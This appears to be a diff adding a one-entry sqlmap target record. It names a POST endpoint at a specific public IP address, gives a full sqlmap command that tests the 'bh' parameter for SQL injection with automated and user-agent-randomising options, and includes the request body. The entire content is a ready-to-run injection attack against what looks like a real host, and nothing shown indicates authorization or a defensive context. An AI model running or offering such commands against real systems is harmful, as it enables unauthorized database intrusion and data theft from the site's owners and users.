@@ -1,0 +1,3 @@
+http://8.136.14.165:80/apage/ (POST)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests_baseline\006_SQL_Injection_bh_3883167794493130465.txt --batch --smart --random-agent --output-dir sqlmap_output_baseline\006_3883167794493130465 -p bh
+
+bh=1&filter=q&list=iseva&page=0
